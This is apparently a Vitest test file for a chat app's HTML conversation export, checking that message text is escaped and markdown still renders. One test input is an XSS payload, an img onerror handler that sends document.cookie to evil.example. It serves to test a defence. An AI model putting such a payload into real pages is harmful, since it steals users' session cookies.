import { describe, expect, it, vi } from 'vitest';
import type { Message, Topic } from '../store/types';

// 导出工具取 i18n 的 t()/locale()/formatDateTime——node 环境打桩后只测转义逻辑
vi.mock('../i18n', () => ({
  t: (key: string) => key,
  locale: () => 'zh-CN',
  formatDateTime: () => '2026-01-01 00:00',
}));

const { exportAsHtml } = await import('./exportConversation');

function msg(role: 'user' | 'assistant', content: string): Message {
  return { role, content, timestamp: Date.now() } as unknown as Message;
}

function topic(history: Message[]): Topic {
  return { id: 't1', name: '测试话题', summary: '', history, renamed: false } as unknown as Topic;
}

describe('exportAsHtml escaping (CHAT-1)', () => {
  it('escapes HTML/script payloads in plain message text', () => {
    const html = exportAsHtml(
      topic([
        msg('user', '看看这个 <script>alert(1)</script>'),
        msg(
          'assistant',
          '<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)"> 好的',
        ),
      ]),
      { includeReasoning: false },
    );
    // 任意明文（用户与助手一视同仁）不允许以原始标签形式进入产物
    expect(html).not.toContain('<script>');
    expect(html).not.toContain('<img ');
    // 转义后的实体存在
    expect(html).toContain('&lt;script&gt;');
    expect(html).toContain('&lt;img');
  });

  it('still renders basic markdown markup after whole-input escaping', () => {
    const html = exportAsHtml(topic([msg('assistant', '**要点** 与 `code`')]), {
      includeReasoning: false,
    });
    expect(html).toContain('<strong>要点</strong>');
    expect(html).toContain('<code>code</code>');
  });
});
